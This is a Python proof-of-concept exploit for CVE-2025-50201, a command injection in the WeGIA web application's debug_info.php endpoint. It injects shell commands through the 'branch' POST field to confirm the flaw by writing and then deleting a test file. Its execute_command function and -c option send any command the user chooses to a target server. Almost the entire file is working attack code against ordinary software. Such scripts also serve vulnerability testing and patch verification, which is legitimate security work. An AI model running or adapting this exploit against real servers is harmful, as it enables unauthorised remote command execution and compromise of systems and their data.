#!/usr/bin/env python3
import requests
import time
import sys
import argparse
import random
import string

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def check_vulnerability(target_url, timeout=30):
    """
    CVE-2025-50201: OS Command Injection in WeGIA debug_info.php
    Verifies vulnerability by creating a test file
    """
    vuln_endpoint = f"{target_url.rstrip('/')}/WeGIA/html/configuracao/debug_info.php"
    
    test_id = generate_random_string()
    test_filename = f"poc_{test_id}.txt"
    test_content = f"CVE-2025-50201-{test_id}"
    
    create_payload = {
        "branch": f"master; echo '{test_content}' > /var/www/html/WeGIA/html/configuracao/{test_filename}",
        "action": "switch"
    }
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0"
    }
    
    print(f"[*] Target: {vuln_endpoint}")
    print(f"[*] Testing OS Command Injection (CVE-2025-50201)")
    print(f"[*] Creating test file: {test_filename}")
    
    try:
        response = requests.post(
            vuln_endpoint,
            data=create_payload,
            headers=headers,
            timeout=timeout,
            allow_redirects=False
        )
        print(f"[*] HTTP Status: {response.status_code}")
        
        time.sleep(1)
        
        check_url = f"{target_url.rstrip('/')}/WeGIA/html/configuracao/{test_filename}"
        check_response = requests.get(check_url, timeout=10)
        
        if test_content in check_response.text:
            print(f"[+] VULNERABLE! Test file created at: {check_url}")
            print(f"[+] OS Command Injection confirmed (CVE-2025-50201)")
            
            cleanup_payload = {
                "branch": f"master; rm /var/www/html/WeGIA/html/configuracao/{test_filename}",
                "action": "switch"
            }
            requests.post(vuln_endpoint, data=cleanup_payload, headers=headers, timeout=10, allow_redirects=False)
            print(f"[*] Cleanup: test file removed")
            return True
        else:
            print(f"[-] Test file not found. Vulnerability may not be exploitable.")
            return False
            
    except requests.exceptions.Timeout:
        print(f"[-] Request timed out")
        return False
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def execute_command(target_url, command, timeout=30):
    """
    Execute arbitrary command via blind injection
    """
    vuln_endpoint = f"{target_url.rstrip('/')}/WeGIA/html/configuracao/debug_info.php"
    
    payload = {
        "branch": f"master; {command}",
        "action": "switch"
    }
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0"
    }
    
    print(f"[*] Executing command: {command}")
    
    try:
        response = requests.post(
            vuln_endpoint,
            data=payload,
            headers=headers,
            timeout=timeout,
            allow_redirects=False
        )
        print(f"[*] Command sent, HTTP Status: {response.status_code}")
        return True
    except requests.exceptions.Timeout:
        print(f"[*] Request timed out (command may still have executed)")
        return True
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2025-50201 PoC - WeGIA OS Command Injection")
    parser.add_argument("-t", "--target", default="http://localhost:8085", help="Target URL")
    parser.add_argument("-c", "--command", help="Command to execute (optional)")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("CVE-2025-50201 - WeGIA OS Command Injection PoC")
    print("Vulnerable: WeGIA <= 3.4.1")
    print("Endpoint: /html/configuracao/debug_info.php")
    print("=" * 60)
    
    is_vuln = check_vulnerability(args.target)
    
    if is_vuln and args.command:
        print(f"\n[*] Executing custom command...")
        execute_command(args.target, args.command)
    
    sys.exit(0 if is_vuln else 1)
